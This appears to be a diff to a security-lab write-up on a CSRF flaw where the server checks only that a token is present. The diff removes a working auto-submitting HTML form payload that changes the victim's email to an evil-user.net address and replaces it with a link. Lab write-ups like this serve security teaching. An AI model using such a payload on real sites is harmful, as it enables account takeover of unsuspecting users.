@@ -23,20 +23,8 @@ reuses the cookie for this site and submits a POST request on the user's behalf,
 request. Usually a CSRF token is used to prevent this, however, the server only checks if the token
 is present, not if it is correct.
 
-Below is the CSRF HTML payload we use to solve this lab:
 
-
-<html>
-  <body>
-    <form action="https://3.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pwned&#64;evil&#45;user&#46;net" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<a href="3.txt">Solution</a>
 
 
 
